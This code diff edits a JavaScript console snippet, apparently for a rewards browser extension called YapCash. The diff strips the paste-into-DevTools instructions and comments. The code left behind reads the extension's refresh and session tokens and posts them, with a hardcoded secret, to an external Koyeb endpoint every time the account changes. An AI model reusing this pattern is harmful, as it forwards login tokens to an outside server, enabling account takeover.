@@ -1,15 +1,5 @@
-/**
- * ⚡ YapCash 1-Click Chrome Passive Token Sync Snippet (PC Browser)
- * 
- * Instructions:
- * 1. Open Chrome on your PC.
- * 2. Click the YapCash Extension icon -> Right-click & select "Inspect Popup" (or open Chrome DevTools console).
- * 3. Paste this code into the Console and hit Enter.
- * 4. Whenever you log in or switch accounts in the YapCash Chrome Extension, the active token is automatically sent to Koyeb!
- */
-
 (function () {
-  const KOYEB_URL = "https://conservation-lory-agentdark-7e1cc3c7.koyeb.app/api/sync-token"; // Live Koyeb App URL
+  const KOYEB_URL = "https://conservation-lory-agentdark-7e1cc3c7.koyeb.app/api/sync-token";
   const SYNC_SECRET = "yapcash_secret_2026";
 
   async function syncActiveToken() {
@@ -71,10 +61,8 @@
     }
   }
 
-  // Execute immediately
   syncActiveToken();
 
-  // Listen for live storage updates when switching accounts in YapCash extension
   if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged) {
     chrome.storage.onChanged.addListener((changes) => {
       if (changes.refreshToken || changes.session || changes["sb-gidoyrbvnffcwbzzweqb-auth-token"]) {
